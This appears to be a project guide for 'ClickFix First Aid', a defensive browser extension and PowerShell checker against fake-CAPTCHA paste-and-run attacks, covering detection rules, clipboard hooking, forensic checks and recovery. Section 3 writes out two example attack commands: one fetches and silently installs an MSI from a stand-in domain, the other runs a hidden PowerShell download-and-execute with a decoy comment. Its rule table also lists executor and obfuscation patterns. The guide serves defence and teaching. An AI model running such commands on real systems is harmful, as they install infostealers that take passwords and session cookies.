# Learn how ClickFix First Aid works

This guide explains every part of the project in plain language. You do not need to be a security expert. If you read it top to bottom, you will understand the attack, how each piece of the defense works, and where you could improve it.

## 1. The attack in 60 seconds

1. You visit a page. It could be a search result, an ad, a hacked website, or even a page inside a work task.
2. The page shows something that looks like a CAPTCHA: "Verify you are human".
3. You click the checkbox. Behind the scenes, the page's JavaScript runs `navigator.clipboard.writeText("...")` and puts a command on your clipboard. You see nothing.
4. The page then shows "verification steps": press **Win+R** (opens the Windows Run box), press **Ctrl+V** (pastes), press **Enter** (runs).
5. The command downloads a program and runs it. Usually it is an **infostealer**. It copies your browser's saved passwords and **session cookies** (the little tokens that keep you logged in), plus chat apps' login data and files, and sends them to the attacker.
6. Criminals load your cookies into their own browser and are instantly logged in as you. No password needed, no OTP needed, because as far as the website knows, you already logged in.

Why it works so well: **no software bug is used**. You run the command yourself, so many protections never fire. The Run box is also unfamiliar to most people, so it does not feel dangerous.

There are variants:
- **Win+X**: opens a menu with Terminal / PowerShell.
- **FileFix**: tells you to paste into the **File Explorer address bar** instead, disguised as a file path.
- **Mac**: tells you to open **Terminal** (Cmd+Space) and paste.

## 2. Map of the project

```
rules/clickfix-rules.json     What an attack looks like (the "knowledge")
engine/detector.js            The JavaScript code that applies the rules
extension/                    The Chrome/Edge extension
  src/page-hook.js              Clipboard guard, runs inside web pages
  src/content.js                Re-checks reports, watches page text
  src/ui.js                     The warnings you see
  src/background.js             Counters, red "!" badge, closing tabs
  popup/                        The window when you click the icon
  pages/recovery.html           Offline copy of the recovery guide
checker/src/Check-ClickFix.ps1    Windows PC check (source)
checker/src/Protect-RunDialog.ps1 Win+R / Win+X switch (source)
guide/                        Recovery guide, website and demo (sources)
docs/                         The published website (generated)
tests/                        All tests and harmless fake trap pages
scripts/build.mjs             Turns the sources into the finished files
```

**Single source of truth:** you edit the rules once in `rules/clickfix-rules.json`. The build script (`npm run build`) copies them into the extension and embeds them inside the PowerShell checker. So the browser and the PC check always make the same decisions.

## 3. The rules and how a command is judged

Every pattern in the rules file is a **regular expression** (a text-matching pattern). They are grouped:

| Group | Question it answers | Examples |
|---|---|---|
| `executors` | Does it start a program? | `powershell`, `cmd /c`, `mshta`, `msiexec`, `rundll32`, `iex`, `\| bash` |
| `remote` | Does it reach the internet? | a web address, `curl`, `irm`, an IP address, a network share `\\host\` |
| `encoded` | Is the real content hidden? | `-enc <Base64>`, `FromBase64String`, `base64 -d` |
| `stealth` | Is it trying not to be noticed? Each has a weight. | hidden window (25), `^` disguises (25), silent install (20), raw IP (20), cheap domain like `.top` (15) |
| `decoys` | Does it hide fake text after the real command? | `# I am not a robot - Verification ID: 1234`, or `# C:\HR\Policy.docx` (FileFix) |

Before matching, the engine **undoes simple disguises**: `c^m^d` becomes `cmd`, ``p`o`wershell`` becomes `powershell`, `'pow'+'ershell'` becomes `powershell`.

Then it decides:

1. Not starting any program? **Allow.** (Normal text, links, `npm install`.)
2. Has a decoy comment? **Block.** Real tools never do this.
3. The page says "Win+R ... paste"? **Block** any command.
4. Starts a program, reaches the internet, and stealth weight is 25 or more? **Block.**
5. Starts a program and reaches the internet, nothing sneaky, but the copy came from **inside a frame** embedded in the page? **Block.** Trap pages often hide the fake checkbox in a frame, where it cannot see the "Win+R" text in the outer page.
6. Starts a program and reaches the internet, nothing sneaky? **Gentle warning only.** This is how real developer installers look, for example `irm https://get.scoop.sh | iex`.
7. No internet seen, but stealth weight is 50 or more? **Block.**

For rule 3, the extension first reads the page's visible text. If that looks innocent, it also reads hidden text, because many trap pages copy the command first and only then un-hide their "Win+R, Ctrl+V" steps.

### Worked example: the command shape from the incident

```
cmd /c curl -s -o %TEMP%\S775.msi https://cloubflare.example.top/5 && msiexec /i %TEMP%\S775.msi /qn
```

- Starts programs: `cmd /c`, `msiexec`
- Reaches the internet: a web address, `curl`
- Stealth: saves into `%TEMP%` (10) + silent install `/qn` (20) + cheap `.top` domain (15) = **45**
- 45 is at least 25, so: **block**. The warning lists all six reasons in plain words.

### Worked example: classic fake reCAPTCHA

```
powershell -w h -nop -c "iex(irm https://203.0.113.7/a)" # I am not a robot - reCAPTCHA Verification ID: 4821
```

The `# I am not a robot ...` part is the decoy. In the Run box, only the end of a long line is visible, so the victim sees the friendly text, not the command. Decoy found, so: **block** straight away.

## 4. Part 1: the browser extension

### Content scripts and the two "worlds"

An extension can inject scripts into web pages. Chrome runs them in one of two **worlds**:

- **MAIN world**: the same JavaScript world as the page. We need this to wrap the page's clipboard functions *before* the page uses them. Downside: the page can see and tamper with things here.
- **ISOLATED world**: the extension's private world. The page cannot touch it. Used for checking and drawing warnings.

`run_at: document_start` makes our scripts run before the page's own scripts.

### The four ways a page can copy, and how each is guarded (`page-hook.js`)

1. `navigator.clipboard.writeText(text)`: we replace the function. If the text is an attack, we call the real function with the safe message instead.
2. `navigator.clipboard.write([ClipboardItem])`: same idea, after reading the text out of the item.
3. `document.execCommand('copy')` on a hidden text box: we note that the page started the copy, and our `copy` event listener checks the selected text.
4. A page `copy` handler calling `event.clipboardData.setData(...)`: we wrap `setData`.

**Tamper protection:** a hostile page could replace built-in functions like `RegExp.prototype.exec` to make our checks always say "fine". So both the guard and the engine **grab the built-ins they need the moment they load**, before any page script runs, and only use those copies. There is a test for this.

### The safe message

The clipboard gets this instead of the attack:

```
# STOP. ClickFix First Aid blocked this. A website tried to trick you into running a command on your computer. Close that page. Real human checks never ask you to paste anything.
```

It starts with `#`, which makes PowerShell and Mac/Linux shells treat the whole line as a comment, so nothing runs. In the Run box or File Explorer it simply fails to open. It deliberately contains no quotes, `|`, `&`, `$` or `>`, which shells could act on.

### Why the page cannot fake our warning

The guard sends a report to the isolated world with only the raw text. The isolated world (`content.js`) **runs the detection again itself** and builds the reasons from its own trusted rules. So a page cannot make us show a scary message with its own wording, for example a fake "call this support number" scam.

Warnings are drawn inside a **closed shadow root** (`ui.js`): a private piece of the page that the page's scripts cannot read, restyle or click. All text is inserted as plain text, never as HTML.

### Trap pages and iframes

`content.js` also reads the page's visible text and looks for the trap pattern: a run shortcut (Win+R, Win+X, File Explorer address bar, Cmd+Space) **and** "paste" **and** a "verify / CAPTCHA / fix the error" theme. If all three appear, a red banner warns you even before anything is copied. Trap pages often reveal their steps only after the click, so it re-checks when the page changes.

Many traps put the checkbox inside an **iframe** (a page inside a page). The background script relays the warning to the top of the tab so it covers the whole screen.

### Permissions

Only `storage` (for the counters in the popup) and the right to run on pages. No network access at all, so nothing can be sent anywhere.

## 5. Part 2: the PC check (`Check-ClickFix.ps1`)

It answers: "Did this PC already run a ClickFix command?" Investigators look in these places:

| Place | Why |
|---|---|
| `HKCU\...\Explorer\RunMRU` | Windows remembers what was typed or pasted into the Run box. A ClickFix command usually sits right there. |
| `HKCU\...\Explorer\TypedPaths` | The File Explorer address bar history, which catches FileFix. |
| PowerShell history (`PSReadLine\*_history.txt`) | Commands pasted into PowerShell or Terminal. |
| New `.exe/.msi/.ps1/...` files in Temp and AppData | Where downloaded malware usually lands. Unsigned ones are flagged for review. |
| Windows Installer log (event 1033) | Programs installed recently. Random-looking names like `NYcTodYVA0` are flagged. |
| Run keys, Startup folders, scheduled tasks | How malware makes itself start again after a reboot. |

Each command found goes through the same rules. The result is **danger** (signs of an attack), **review** (check these items) or **clean**.

Design choices:
- **Read-only.** It never deletes anything. Deleting the wrong thing can break a PC, and evidence is useful.
- **ASCII only.** Windows PowerShell 5.1 reads script files as ANSI, so any fancy character would turn into garbage. The build refuses non-ASCII text.
- **Run by right-click, never by pasting.** It would be ironic to teach people to paste commands from a website in order to protect themselves from pasting commands from a website.

## 6. Part 3: the Win+R switch (`Protect-RunDialog.ps1`)

Windows has a per-user setting called `DisabledHotkeys` under `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced`. Putting the letters `R` and `X` in it turns off Win+R and Win+X. The script adds or removes only those two letters (keeping any others), then restarts File Explorer. It also checks that Windows Terminal still warns before pasting several lines.

## 7. Part 4: the recovery guide

`guide/recovery.html` is the plan that worked in a real incident, in order:

1. Disconnect the PC.
2. From the **phone**, secure email first, because email can reset everything else.
3. Sign out of all sessions everywhere else. This matters more than changing passwords, because the stolen thing is your *session*, not your password.
4. Clean the PC: offline scan, or reset Windows.
5. Keep watch for months: login alerts, scam calls using your real details, your credit report.

Every menu path in it was checked against the official help pages of Google, Microsoft, Telegram and others. Menus change, so the guide also says what to search for if a menu has moved.

## 8. How it is tested

| Command | What it checks |
|---|---|
| `npm test` | 33 engine tests: 11 attack shapes are blocked, 10 normal things are allowed, 3 developer installers only get a note, page detection, frames, tamper resistance. |
| `npm run test:ps` | 56 PowerShell tests: the checker makes the **same decisions** as the JavaScript engine on every shared sample, whole-PC analysis with fake evidence, the Win+R helper, scripts parse and are pure ASCII. |
| `npm run test:e2e` | 15 tests that load the real extension into Chromium and click through harmless fake trap pages: all four copy methods, iframes, steps revealed late, the public demo, no false alarms on normal pages. |

Two good habits we used:
- **Control run.** Run the same trap pages with the extension *switched off* and confirm the attack text really lands on the clipboard. Otherwise a test can pass for the wrong reason.
- **Test first for a gap.** When a weakness was spotted (a plain command copied from a frame, or copied before the steps appeared), we first wrote a test page for it and watched the test **fail**, then fixed the code and watched it pass.

## 9. Ideas for next versions (good places to contribute)

- Translations of the warnings and the guide, for example Hindi and Telugu.
- Publish to the Chrome Web Store and Microsoft Edge Add-ons.
- Firefox support.
- A Mac version of the PC check (Terminal history, LaunchAgents).
- Collect new real-world ClickFix commands (safely defanged) as test samples.
- A short video showing the attack and the block, for social media awareness.

## 10. Glossary

- **ClickFix**: a fake check that tricks you into pasting and running a command.
- **Infostealer**: malware that copies saved passwords, cookies and files, then sends them away.
- **Session cookie**: a token that keeps you logged in. Whoever has it is "you" to the website until you sign out.
- **Clipboard**: what Ctrl+C copies and Ctrl+V pastes.
- **Run box**: the small Windows window that opens with Win+R and runs whatever you type.
- **LOLBin** ("living off the land" binary): a normal Windows program (like `mshta` or `certutil`) abused by attackers, so no new malware tool is needed at first.
- **Obfuscation**: disguising text so security tools do not recognize it, like `c^m^d`.
- **Defang**: breaking a dangerous link so it cannot be clicked, like `hxxps[://]`.
- **Regular expression**: a pattern for matching text.
- **Shadow root**: a private, sealed part of a web page.
